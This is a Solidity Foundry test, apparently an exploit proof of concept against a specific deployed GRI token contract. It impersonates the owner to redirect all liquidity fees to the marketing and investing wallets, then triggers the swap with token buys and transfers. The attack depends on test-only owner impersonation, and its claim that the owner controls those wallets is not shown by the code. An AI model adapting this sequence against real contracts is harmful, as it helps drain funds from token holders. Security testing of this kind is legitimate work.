pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGRI {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setPercentageOfLiquidityForMarketing(uint256 marketingFee) external;
    function setSwapAndLiquifyEnabled(bool e) external;
    function setMinimumTokenBalance(uint256 minimumToken) external;
    function _uniswapV2Pair() external view returns (address);
    function _marketingWallet() external view returns (address);
    function _investingWallet() external view returns (address);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode and impersonate
        vm.label(TARGET, "GRI Token");
        vm.label(attacker, "Attacker");

        // Get the current owner of the contract
        IGRI token = IGRI(TARGET);
        address owner = token.owner();
        vm.label(owner, "Original Owner");

        // Label marketing and investing wallets
        vm.label(0x8f1597d17a87543B94d47408528Af63a7B2A591f, "Marketing Wallet");
        vm.label(0x37519d811b739Cc80e009b8d36CDA6D4fcC069c6, "Investing Wallet");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial BNB balance of marketing/investing wallets
        uint256 initialMarketingBalance = address(0x8f1597d17a87543B94d47408528Af63a7B2A591f).balance;
        uint256 initialInvestingBalance = address(0x37519d811b739Cc80e009b8d36CDA6D4fcC069c6).balance;

        // Get contract owner
        IGRI token = IGRI(TARGET);
        address owner = token.owner();

        // Step 1: Impersonate owner
        vm.startPrank(owner);

        // Step 2: Set marketing percentage to 100 (ALL BNB goes to marketing/investing)
        token.setPercentageOfLiquidityForMarketing(100);

        // Step 3: Ensure swapAndLiquify is enabled (should be by default)
        token.setSwapAndLiquifyEnabled(true);

        // Step 4: Set min token balance low to trigger swap easily
        token.setMinimumTokenBalance(1);

        vm.stopPrank();

        // Step 5: Get tokens to generate fees
        // Give attacker some BNB to buy tokens
        deal(attacker, 10 ether);

        // Buy tokens on PancakeSwap
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(router);

        address[] memory path = new address[](2);
        path[0] = uniswapRouter.WETH();
        path[1] = TARGET;

        vm.prank(attacker);
        uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Now attacker has tokens
        uint256 attackerBalance = token.balanceOf(attacker);
        require(attackerBalance > 0, "Attacker should have tokens");

        // Make multiple transfers to accumulate fees in contract
        // Each transfer generates liquidity fees that go to contract address
        address[] memory recipients = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            recipients[i] = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
            uint256 transferAmount = attackerBalance / 10;

            vm.prank(attacker);
            token.transfer(recipients[i], transferAmount);

            attackerBalance = token.balanceOf(attacker);
        }

        // Now contract should have accumulated fees
        // Check contract token balance
        uint256 contractBalance = token.balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // Make one more transfer to trigger swapAndLiquify
        // Transfer to pair address or any address
        address finalRecipient = address(0x999);
        vm.prank(attacker);
        token.transfer(finalRecipient, token.balanceOf(attacker));

        // Step 6: Check if marketing/investing wallets received BNB
        uint256 finalMarketingBalance = address(0x8f1597d17a87543B94d47408528Af63a7B2A591f).balance;
        uint256 finalInvestingBalance = address(0x37519d811b739Cc80e009b8d36CDA6D4fcC069c6).balance;

        console.log("Initial marketing balance:", initialMarketingBalance);
        console.log("Final marketing balance:", finalMarketingBalance);
        console.log("Initial investing balance:", initialInvestingBalance);
        console.log("Final investing balance:", finalInvestingBalance);

        // Verify exploit worked - marketing/investing wallets should have received BNB
        assertGt(finalMarketingBalance, initialMarketingBalance, "Marketing wallet should have received BNB");
        assertGt(finalInvestingBalance, initialInvestingBalance, "Investing wallet should have received BNB");

        // As owner, we control these wallets, so this represents profit
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

